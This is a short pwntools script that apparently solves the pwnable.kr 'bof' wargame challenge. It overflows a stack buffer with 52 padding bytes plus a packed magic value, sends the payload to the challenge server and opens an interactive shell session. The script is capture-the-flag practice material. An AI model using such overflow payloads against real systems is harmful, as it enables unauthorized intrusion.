from pwn import *

payload = 'A' * 52 + p32(0xcafebabe)
p = remote('pwnable.kr',9000)
p.sendline(payload)
p.interactive()